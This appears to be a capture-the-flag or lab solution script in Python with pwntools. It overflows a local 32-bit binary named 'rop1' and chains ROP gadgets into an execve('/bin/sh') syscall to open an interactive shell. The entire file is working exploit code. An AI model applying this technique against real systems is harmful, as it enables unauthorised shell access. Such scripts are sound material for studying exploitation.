from pwn import *

# Configure pwntools
context.arch = 'i386'
context.os = 'linux'
context.word_size = 32

# Create process
elf = ELF('./rop1')
p = process('./rop1')

# ROP gadgets
POP_EAX = 0x0804919a
POP_EBX = 0x0804901e
POP_ECX = 0x080491a4
INT_80  = 0x080491b4
BINSH   = 0x0804b008  # Address of "/bin/sh" string

# Simple execve("/bin/sh", 0, 0) payload
payload = b"A" * 28              # Padding
payload += p32(POP_EAX)
payload += p32(0xb)              # execve syscall number
payload += p32(POP_EBX)
payload += p32(BINSH)            # ptr to "/bin/sh"
payload += p32(POP_ECX)
payload += p32(0)                # NULL
payload += p32(INT_80)

print("[*] Sending payload of length:", len(payload))
p.sendline(payload)
p.interactive()
